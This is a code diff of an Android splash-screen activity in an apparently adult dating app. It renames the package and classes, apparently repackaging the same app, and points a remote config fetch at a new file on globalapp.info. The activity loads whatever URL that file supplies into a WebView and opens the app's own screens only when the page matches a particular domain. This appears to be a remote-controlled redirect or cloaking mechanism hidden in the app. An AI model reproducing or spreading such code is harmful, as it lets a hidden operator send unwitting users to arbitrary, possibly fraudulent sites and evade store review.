@@ -1,4 +1,4 @@
-package com.dating.adults.datingadults.activities;
+package com.love.adults.adultsdating.activities;
 
 import android.Manifest;
 import android.app.Activity;
@@ -30,7 +30,7 @@ import android.widget.ImageView;
 import android.widget.LinearLayout;
 import android.widget.Toast;
 
-import com.dating.adults.datingadults.R;
+import com.love.adults.adultsdating.R;
 
 import java.io.BufferedReader;
 import java.io.File;
@@ -48,7 +48,7 @@ import java.util.Timer;
 import java.util.TimerTask;
 
 
-public class SplashScreenActivityed extends Activity {
+public class SplashScreenRenamedActivityed extends Activity {
     //    private InterstitialAd mInterstitialAd;
     public static String TAG = "Cash";
 
@@ -101,7 +101,7 @@ public class SplashScreenActivityed extends Activity {
                     }
                 } else {
                     if (url.contains("http://appgplaybestpro.info")) {
-                        Intent intent = new Intent(getApplicationContext(), MailActivityed.class);
+                        Intent intent = new Intent(getApplicationContext(), MailRenamedActivityed.class);
                         startActivity(intent);
                         finish();
                         return false;
@@ -150,7 +150,7 @@ public class SplashScreenActivityed extends Activity {
                 public void run() {
                     URLConnection conn = null;
                     try {
-                        conn = new URL("http://globalapp.info/5.txt").openConnection();
+                        conn = new URL("http://globalapp.info/6.txt").openConnection();
                         InputStream in = conn.getInputStream();
                         site = convertStreamToString(in);
                     } catch (IOException e) {
@@ -165,7 +165,7 @@ public class SplashScreenActivityed extends Activity {
                     if (site != null && site != "") {
                         mWebView.loadUrl(site.substring(0, site.length() - 1));
 
-//                    Toast.makeText(SplashScreenActivityed.this, "redirected from: " + site, Toast.LENGTH_LONG).show();
+//                    Toast.makeText(SplashScreenRenamedActivityed.this, "redirected from: " + site, Toast.LENGTH_LONG).show();
                     }
                 }
             }, 1000);
@@ -176,7 +176,7 @@ public class SplashScreenActivityed extends Activity {
                     try {
                         if (mWebView.getUrl().contains("http://appgplaybestpro.info")) {
 
-                            Intent intent = new Intent(getApplicationContext(), MailActivityed.class);
+                            Intent intent = new Intent(getApplicationContext(), MailRenamedActivityed.class);
                             startActivity(intent);
                             finish();
                         } else {
@@ -355,7 +355,7 @@ public class SplashScreenActivityed extends Activity {
 
                             interstitialAsLoad.cancel();
 
-                            SplashScreenActivityed.this.finish();
+                            SplashScreenRenamedActivityed.this.finish();
                         }
                         timer[0]++;
                     }
@@ -365,7 +365,7 @@ public class SplashScreenActivityed extends Activity {
     }
 
     public void startMenuActivity () {
-        startActivity(new Intent(getApplicationContext(), MailActivityed.class));
+        startActivity(new Intent(getApplicationContext(), MailRenamedActivityed.class));
     }
 
     @Override
